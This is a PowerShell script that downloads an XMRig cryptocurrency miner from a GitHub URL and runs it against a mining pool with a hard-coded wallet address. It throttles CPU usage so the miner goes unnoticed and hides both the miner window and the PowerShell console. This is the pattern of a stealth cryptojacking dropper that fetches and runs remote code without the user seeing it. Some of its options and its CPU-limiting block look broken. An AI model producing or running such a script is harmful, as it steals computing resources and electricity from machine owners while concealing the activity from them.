# Path to miner executable
$minerUrl = "https://github.com/Mrx-coder-1157/mining-scripts/raw/main/xmrig.exe"
$minerPath = "C:\Miners\xmrig.exe"

# Log file path (modify as needed)
$logFilePath = "C:\Miners\Logs\mining_log.txt"

# Step 1: Download the miner if it's not already downloaded
if (-not (Test-Path -Path $minerPath)) {
    Write-Host "Downloading the miner..."
    Invoke-WebRequest -Uri $minerUrl -OutFile $minerPath
    Write-Host "Miner downloaded successfully!"
} else {
    Write-Host "Miner already exists. Proceeding to run."
}

# Step 2: Set the arguments for low CPU usage, 2 threads, GPU if available
$cpuThreads = 2
$cpuUsageLimit = 20  # Ensure CPU usage stays below 20%

# Setup arguments for XMRig (using low intensity for CPU and GPU)
$arguments = "--cpu-threads $cpuThreads --cpu-threads-intensity 1 --pool rx.unmineable.com:3333 --wallet BTC:1H8fueovMvcQLArhxw7P4QZ3FAfhEZg7CB.unmineable_miner_iahxfi --password x --disable-msr --disable-huge-pages --randomx-no-1gb-pages --no-cpu-affinity --extended-log --api-enable --api-port 60130"

# Check if GPU is available
$gpuCheck = Get-WmiObject Win32_VideoController

if ($gpuCheck) {
    Write-Host "GPU detected, will use GPU for mining."
    # Use CUDA for GPU mining, but set low intensity to limit GPU load
    # Limiting GPU intensity to 20% (you can adjust this as needed)
    $arguments = $arguments + " --cuda --cuda-devices 0 --cuda-bfactor 1 --cuda-lan 1 --cuda-threads 2"
    
    Write-Host "Setting GPU mining intensity to low (20%)."
} else {
    Write-Host "No GPU detected, using CPU only."
}

# Step 3: Ensure we're limiting the CPU usage to 20% for the miner
$cpuLimitScript = @'
$process = Get-Process -Name "xmrig" 
$process | ForEach-Object { $_.CPU = [math]::min($_.CPU, 0.2) }  # Limit CPU usage to 20%
Start-Sleep -Seconds 1
'@

# Step 4: Run the miner silently in the background, hidden from view
Start-Process -FilePath $minerPath -ArgumentList $arguments -WindowStyle Hidden -RedirectStandardOutput $logFilePath -RedirectStandardError $logFilePath

# Hide the PowerShell Window completely
$psScript = {
    # This hides the PowerShell window completely (it won't show up in Task Manager)
    Add-Type -TypeDefinition @'
    using System;
    using System.Runtime.InteropServices;
    public class Win32 {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ShowWindow(IntPtr hwnd, int nCmdShow);
    }
'@
    $consolePtr = [Win32]::GetConsoleWindow()
    [Win32]::ShowWindow($consolePtr, 0)  # 0 is for hiding the window
}

# Run the hiding script
Invoke-Command -ScriptBlock $psScript

Write-Host "Miner is running in the background with low CPU and GPU usage. Logs are being saved to $logFilePath."
